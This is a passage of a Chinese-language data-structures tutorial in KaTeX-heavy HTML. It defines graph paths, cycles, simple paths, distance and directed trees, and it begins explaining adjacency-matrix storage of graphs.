style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 之间的一条路径是指顶点序列 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>p</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><msub><mi>i</mi><mn>1</mn></msub></msub><mo separator="true">,</mo><msub><mi>v</mi><msub><mi>i</mi><mn>2</mn></msub></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>v</mi><msub><mi>i</mi><mi>m</mi></msub></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">v_{p}, v_{i_{1}}, v_{i_{2}}, \dotsc, v_{i_{m}}, v_{q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，当然关联的边也可理解为路径的构成要素。路径上边的数目称为 <strong>路径长度</strong>。第一个顶点和最后一个顶点相同的路径称为 <strong>回路</strong> 或 <strong>环</strong>。若一个图有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个顶点，并且有大于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 条边，则此图一定有环。</p>
</li>
<li>
<p><strong>简单路径，简单回路</strong></p>
<p>在路径序列中，顶点不重复出现的路径称为 <strong>简单路径</strong>。除第一个顶点和最后一个顶点外，其余顶点不重复出现的回路称为 <strong>简单回路。</strong></p>
</li>
<li>
<p><strong>距离</strong></p>
<p>从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span> 出发到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 的最短路径若存在，则此路径的长度称为从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 的 <strong>距离</strong>。若从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 根本不存在路径，则记该距离为 <strong>无穷（∞）</strong>。</p>
</li>
<li>
<p><strong>有向树</strong></p>
<p>一个顶点的入度为 <code>0</code>、其余顶点的入度均为 <code>1</code> 的有向图，称为 <strong>有向树。</strong></p>
</li>
</ol>
<h3> 图的存储及基本操作</h3>
<p>图的存储必须要完整、准确地反映顶点集和边集的信息。根据不同图的结构和算法，采用不同的存储方式将对程序的效率产生相当大的影响，因此所选的存储结构应适合于待求解的问题。</p>
<h4> 邻接矩阵法</h4>
<p>所谓邻接矩阵存储，是指用一个一维数组存储图中顶点的信息，用一个二维数组存储图中边的信息（即各顶点之间的接关系），存储顶点之间邻接关系的二维数组称为 <strong>邻接矩阵。</strong></p>
<p>结点数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy="false">(</mo><mi>V</mi><mo separator="true">,</mo><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G  = (V, E)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)</span></span></span></span> 的邻接矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">n \times n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的。将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的顶点编号为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>v</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">v_{1}, v_{2}, \dotsc, v_{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>∈</mo><mi>E</mi></mrow><annotation encoding="application/x-tex">(v_{i}, v_{j}) \in E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span>，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">A[i][j] = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，否则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">A[i][j] = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>。</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>若</mtext><mo stretchy="false">(</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mtext>或</mtext><mo>&lt;</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo>&gt;</mo><mtext>是</mtext><mi>E</mi><mo stretchy="false">(</mo><mi>G</mi><mo stretchy="false">)</mo><mtext>中的边</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>若</mtext><mo stretchy="false">(</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mtext>或</mtext><mo>&lt;</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo>&gt;</mo><mtext>不是</mtext><mi>E</mi><mo stretchy="false">(</mo><mi>G</mi><mo stretchy="false">)</mo><mtext>中的边</mtext></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">
A[i][j] = \begin{cases}
  1, &amp; \text{若} (v_{i}, v_{j}) \text{或} &lt;v_{i}, v_{j}&gt; \text{是} E(G) \text{中的边} \\
  0, &amp; \text{若} (v_{i}, v_{j}) \text{或} &lt;v_{i}, v_{j}&gt; \text{不是} E(G) \text{中的边}
\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">若</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord text"><span class="mord cjk_fallback">或</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord text"><span class="mord cjk_fallback">是</span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal">G</span><span class="mclose">)</span><span class="mord text"><span class="mord cjk_fallback">中的边</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">若</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord text"><span class="mord cjk_fallback">或</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord text"><span class="mord cjk_fallback">不是</span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal">G</span><span class="mclose">)</span><span class="mord text"><span class="mord cjk_fallback">中的边</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>对于带权图而言，若顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 之间有边相连，则邻接矩阵中对应项存放着该边对应的权值，若顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub></mrow><annotation 